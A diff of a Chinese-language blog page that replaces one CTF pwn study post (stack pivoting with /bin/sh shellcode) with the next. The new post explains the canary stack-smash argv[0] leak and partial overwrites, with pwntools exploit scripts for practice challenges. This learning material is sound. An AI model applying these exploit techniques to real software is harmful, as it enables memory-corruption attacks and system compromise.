@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn ROP,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,22 +79,23 @@
 
 
 
-<meta name="description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
-<meta name="keywords" content="pwn ROP">
+<meta name="description" content="唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。 Stack smash原理我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习（6）花式栈溢出1">
-<meta property="og:url" content="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/index.html">
+<meta property="og:title" content="pwn学习（7）花式栈溢出2">
+<meta property="og:url" content="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/index.html">
 <meta property="og:site_name" content="Asa9ao">
-<meta property="og:description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
+<meta property="og:description" content="唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。 Stack smash原理我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg">
-<meta property="og:updated_time" content="2018-11-21T12:01:10.077Z">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg">
+<meta property="og:updated_time" content="2018-11-22T15:36:13.391Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习（6）花式栈溢出1">
-<meta name="twitter:description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
-<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg">
+<meta name="twitter:title" content="pwn学习（7）花式栈溢出2">
+<meta name="twitter:description" content="唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。 Stack smash原理我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg">
 
 
 
@@ -124,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
+  <link rel="canonical" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
 
 
 
 
 
-  <title>pwn学习（6）花式栈溢出1 | Asa9ao</title>
+  <title>pwn学习（7）花式栈溢出2 | Asa9ao</title>
   
 
 
@@ -257,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Asa9ao">
@@ -274,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn学习（6）花式栈溢出1</h1>
+          <h1 class="post-title" itemprop="name headline">pwn学习（7）花式栈溢出2</h1>
         
 
         <div class="post-meta">
@@ -286,8 +287,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T19:22:14+08:00">
-                2018-11-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T21:58:58+08:00">
+                2018-11-22
               </time>
             
 
@@ -346,31 +347,81 @@
       
 
       
-        <p>因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。</p>
-<h1 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h1><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控制的内存，bss段、heap等等），然后在这个位置再进行rop。ctf wiki上为我们总结了几种有可能使用到该技巧的情况：</p>
-<ul>
-<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
-<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
-<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
-</ul>
-<p>当然这个用起来还有一些限制条件，最关键的就是你要能控制栈指针</p>
-<h2 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h2><p>原理看完了就拿题目来练练手吧。题目在ctf wiki的github上可以找到。老规矩先拿ida瞅一眼（保护机制检查不说了，这题啥也没有）<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg" alt=""><br>可以看到vul函数很明显有栈溢出漏洞，而且还意外发现有个hint的函数，不得不说出题人挺友好的<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg" alt=""><br>可以看到hint函数其实就一句sub esp,0x24 ，估计大家也都会想到了，题目的解决思路应该和这有关。</p>
-<p>很明显是栈溢出，因为没有保护，那我们就考虑能不能直接写入shellcode执行，答案是不行，没有合适的地方让我们存储。题目中没有存储的数组，而溢出后只有14个可用字节，所以shellcode是肯定没有办法按照之前的技巧放入的。这时候就需要用到我们的stack poviting技术了</p>
-<p>因为提示很明显了，让esp减掉了0x24，那我们可以想到，我们完全可以在栈上布置shellcode（没有开启DEP），填充完后让esp减掉某个值，再跳转到对应位置，那我们的shellcode不就被执行了吗。</p>
-<p>说干就干，首先要找到能够让我们劫持栈指针的godget，拿ROPgadget查一下<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg" alt=""><br>可以看到有jmp esp这个指令，那我们就可以开始我们的exp构造工作了</p>
+        <p>唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。</p>
+<h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg" alt=""></p>
+<p>如图就是函数在开始时进行的设置“哨位”</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg" alt=""></p>
+<p>这是在函数最后的检查</p>
+<p>当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg" alt=""></p>
+<p>可以看到除了程序的输出外，还额外打印了一句</p>
+<pre><code>*** stack smashing detected ***: ./smashes.dms terminated
+</code></pre><p>这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理</p>
+<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
+{
+  __fortify_fail (&quot;stack smashing detected&quot;);
+}
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
+{
+  /* The loop is added only to keep gcc happy.  */
+  while (1)
+    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
+                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
+}
+</code></pre><p>可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg" alt=""></p>
+<p>保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。</p>
+<p>那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了</p>
+<p><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</strong></p>
+<p>我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了</p>
 <pre><code>from pwn import *
-p = process(&apos;./b0verfl0w.dms&apos;)
-jmp_esp = 0x08048504
-shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
-shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
-shellcode += &quot;\x0b\xcd\x80&quot;
-sub_jmp = asm(&apos;sub esp,0x28;jmp esp&apos;)
-payload = shellcode.ljust(0x20,&apos;a&apos;) + &apos;aaaa&apos; +p32(jmp_esp) + sub_jmp
-#payload = shellcode + (0x20 - len(shellcode))*&apos;a&apos; + &apos;aaaa&apos; + p32(jmp_esp) + sub_jmp
+#p = process(&apos;./smashes.dms&apos;)
+p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
+flag_addr = 0x400d21
+arg0_addr = 0x7fffffffdf48
+name_addr = 0x7fffffffdd30
+payload = (arg0_addr - name_addr)*&apos;a&apos; + p64(flag_addr)
+
+p.recvuntil(&apos;name? &apos;)
 p.sendline(payload)
-p.interactive()
-</code></pre><p>为什么是-0x28呢？实际上是pad + ebp + retaddr算出来的，pad是0x20，四位的ebp，四位的retaddr，自然是0x28了，当然你也可以用别的，不过那就需要你自己改一下shellcode的布置了。</p>
-<p>successful</p>
+p.recvuntil(&apos;flag: &apos;)
+p.sendline(&apos;bb&apos;)
+data = p.recv()
+log.info(data)
+</code></pre><p>要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了</p>
+<h1 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p>
+<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie </p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg" alt=""></p>
+<p>保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了</p>
+<p>那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小</p>
+<p>拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候</p>
+<p>思路齐全，上exp喽</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+#  context.log_level = &quot;debug&quot;
+
+
+while True:
+    try:
+        io = process(&quot;./babypie.dms&quot;, timeout = 1)
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8 + 1))
+        io.recvuntil(&apos;a&apos; * (0x30 - 0x8 + 1))
+        canary = &apos;\0&apos; + io.recvn(7)
+        success(canary.encode(&apos;hex&apos;))
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)
+
+        io.interactive()
+    except Exception as e:
+        io.close()
+        print e
+</code></pre><p>Successful</p>
 
       
     </div>
@@ -386,12 +437,6 @@ p.interactive()
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/pwn-ROP/" rel="tag"># pwn ROP</a>
-          
-        </div>
-      
 
       
       
@@ -401,8 +446,8 @@ p.interactive()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/20/pwn学习（5）格式化字符串漏洞2/" rel="next" title="pwn学习（5）格式化字符串漏洞2">
-                <i class="fa fa-chevron-left"></i> pwn学习（5）格式化字符串漏洞2
+              <a href="/2018/11/21/pwn学习（6）花式栈溢出1/" rel="next" title="pwn学习（6）花式栈溢出1">
+                <i class="fa fa-chevron-left"></i> pwn学习（6）花式栈溢出1
               </a>
             
           </div>
@@ -410,10 +455,6 @@ p.interactive()
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/22/pwn学习（7）花式栈溢出2/" rel="prev" title="pwn学习（7）花式栈溢出2">
-                pwn学习（7）花式栈溢出2 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -545,7 +586,7 @@ p.interactive()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-pivoting"><span class="nav-number">1.</span> <span class="nav-text">stack pivoting</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理说明"><span class="nav-number">1.1.</span> <span class="nav-text">原理说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-CTF-Quals-2016-b0verfl0w"><span class="nav-number">1.2.</span> <span class="nav-text">X-CTF Quals 2016 - b0verfl0w</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Stack-smash"><span class="nav-number">1.</span> <span class="nav-text">Stack smash</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题"><span class="nav-number">1.2.</span> <span class="nav-text">例题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈上的-partial-overwrite"><span class="nav-number">2.</span> <span class="nav-text">栈上的 partial overwrite</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-1"><span class="nav-number">2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题-1"><span class="nav-number">2.2.</span> <span class="nav-text">例题</span></a></li></ol></li></ol></div>
             
 
           </div>
